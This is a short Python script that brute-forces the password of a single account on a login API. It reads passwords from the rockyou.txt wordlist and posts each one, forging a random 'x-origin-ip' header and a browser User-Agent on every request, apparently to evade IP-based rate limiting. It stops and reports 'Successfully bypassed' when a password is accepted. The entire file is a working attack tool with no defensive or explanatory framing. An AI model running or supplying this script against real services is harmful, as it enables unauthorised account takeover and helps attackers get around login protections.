import requests
from dotenv import load_dotenv
import os
import random

load_dotenv()

url = os.getenv("API_URL")
username = os.getenv("USERNAME")

# Generate a random IP address
def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

with open("./rockyou.txt", "r", encoding="latin-1") as passwords:
    passwds = passwords.readlines()

i = 0
for passwd in passwds:
    passwd = passwd.strip()
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'x-origin-ip': generate_random_ip()
    }
    
    res = requests.post(
        url, 
        data={
            "username": username,
            "password": passwd, 
            "deviceType": "browser", 
            "clientName": "Chrome", 
            "os": "Windows", 
            "osVersion": "10.0", 
            "tokenType": "WEB"
        }, 
        headers=headers
    )
    
    res_json = res.json()
    
    if res_json["message"] != "Invalid password":
        print("Successfully bypassed with", passwd)
        exit(0)
    else:
        print(i, ":", res_json)
        i += 1
